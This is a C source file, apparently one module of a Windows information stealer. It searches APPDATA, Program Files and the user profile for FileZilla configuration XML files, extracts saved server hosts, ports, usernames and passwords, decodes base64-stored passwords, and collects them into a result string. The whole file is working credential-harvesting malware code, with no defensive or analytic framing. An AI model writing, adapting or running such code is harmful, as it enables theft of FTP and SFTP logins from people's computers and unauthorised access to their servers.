/* FileZilla with global search */
#include "filezilla.h"
#include "browser/utils.h"
#include "browser/crypto.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>
#include <shlobj.h>

static char* xml_get(const char* xml, const char* tag){
    char open[128];snprintf(open,sizeof(open),"<%s>",tag);
    const char*s=strstr(xml,open);if(!s){snprintf(open,sizeof(open),"<%s ",tag);s=strstr(xml,open);if(!s)return NULL;s=strchr(s,'>');if(!s)return NULL;s++;}
    else s+=strlen(open);
    char close[128];snprintf(close,sizeof(close),"</%s>",tag);
    const char*e=strstr(s,close);if(!e)return NULL;
    int len=(int)(e-s);char*r=malloc(len+1);memcpy(r,s,len);r[len]=0;return r;
}

static void scan_xml(const char* dir, char* result, int* rp, int maxr){
    if(!path_exists(dir))return;
    char srch[MAX_PATH];snprintf(srch,sizeof(srch),"%s\\*.xml",dir);
    WIN32_FIND_DATAA fd;HANDLE hf=FindFirstFileA(srch,&fd);
    if(hf==INVALID_HANDLE_VALUE)return;
    do{if(fd.cFileName[0]=='.')continue;
        char fp[MAX_PATH];snprintf(fp,sizeof(fp),"%s\\%s",dir,fd.cFileName);
        FILE*f=fopen(fp,"rb");if(!f)continue;
        fseek(f,0,SEEK_END);long sz=ftell(f);fseek(f,0,SEEK_SET);
        if(sz<=0||sz>1048576){fclose(f);continue;}
        char*xml=malloc(sz+1);if(!xml){fclose(f);continue;}
        if(fread(xml,1,sz,f)!=(size_t)sz){free(xml);fclose(f);continue;}
        xml[sz]=0;fclose(f);
        int is_b64=strstr(xml,"encoding=\"base64\"")!=NULL;
        const char*p=xml;
        while((p=strstr(p,"<Server"))!=NULL){
            const char*be=strstr(p,"</Server>");if(!be)break;
            int bl=(int)(be-p)+10;char*block=malloc(bl+1);memcpy(block,p,bl);block[bl]=0;
            char*host=xml_get(block,"Host");char*port=xml_get(block,"Port");
            char*user=xml_get(block,"User");char*pass=xml_get(block,"Pass");
            char*proto=xml_get(block,"Protocol");char*name=xml_get(block,"Name");
            if(host&&port&&user&&pass){
                if(is_b64&&pass){int pl=(int)strlen(pass);uint8_t*dec=malloc(pl);int dl=base64_decode(pass,dec,pl);if(dl>0){dec[dl]=0;free(pass);pass=(char*)dec;}else free(dec);}
                const char*ps=(proto&&strcmp(proto,"1")==0)?"SFTP":"FTP";
                *rp+=snprintf(result+*rp,maxr-*rp,"Host: %s Port: %s User: %s Pass: %s Proto: %s (%s)\n",host,port,user,pass?pass:"",ps,fd.cFileName);
            }
            free(host);free(port);free(user);free(pass);free(proto);free(name);free(block);
            p=be+1;
        }
        free(xml);
    }while(FindNextFileA(hf,&fd));
    FindClose(hf);
}

const char* filezilla_scan(const char* custom_path){
    static char result[65536];int rp=0;result[0]=0;
    if(custom_path&&custom_path[0]){scan_xml(custom_path,result,&rp,sizeof(result));if(result[0])return result;}
    /* Search common locations */
    char appdata[MAX_PATH];
    if(SUCCEEDED(SHGetFolderPathA(NULL,CSIDL_APPDATA,NULL,0,appdata))){
        char fp[MAX_PATH];snprintf(fp,sizeof(fp),"%s\\FileZilla",appdata);scan_xml(fp,result,&rp,sizeof(result));
    }
    GetEnvironmentVariableA("APPDATA",appdata,sizeof(appdata));
    if(appdata[0]){char fp[MAX_PATH];snprintf(fp,sizeof(fp),"%s\\FileZilla",appdata);scan_xml(fp,result,&rp,sizeof(result));}
    bool filezilla_seen = false;
    if(appdata[0]){char fp[MAX_PATH];snprintf(fp,sizeof(fp),"%s\\FileZilla",appdata);if(path_exists(fp))filezilla_seen=true;}
    if(result[0] || process_exists("filezilla.exe")) filezilla_seen = true;
    /* Search Program Files — direct one-level check (standard layout), no deep recursion */
    char*pf=getenv("ProgramFiles");if(filezilla_seen&&pf){char fp2[MAX_PATH];snprintf(fp2,sizeof(fp2),"%s\\FileZilla",pf);if(path_exists(fp2))scan_xml(fp2,result,&rp,sizeof(result));}
    char*pf86=getenv("ProgramFiles(x86)");if(filezilla_seen&&pf86){char fp2[MAX_PATH];snprintf(fp2,sizeof(fp2),"%s\\FileZilla",pf86);if(path_exists(fp2))scan_xml(fp2,result,&rp,sizeof(result));}
    /* Search entire UserProfile only after FileZilla evidence exists. */
    if(!result[0]&&filezilla_seen){char up[MAX_PATH];GetEnvironmentVariableA("USERPROFILE",up,sizeof(up));
        char*found=find_dir_recursive(up,"FileZilla",5);if(found){scan_xml(found,result,&rp,sizeof(result));free(found);}}
    if(!result[0])snprintf(result,sizeof(result),"FileZilla not found. Searched: %%APPDATA%%\\FileZilla, Program Files, UserProfile.\n");
    return result;
}
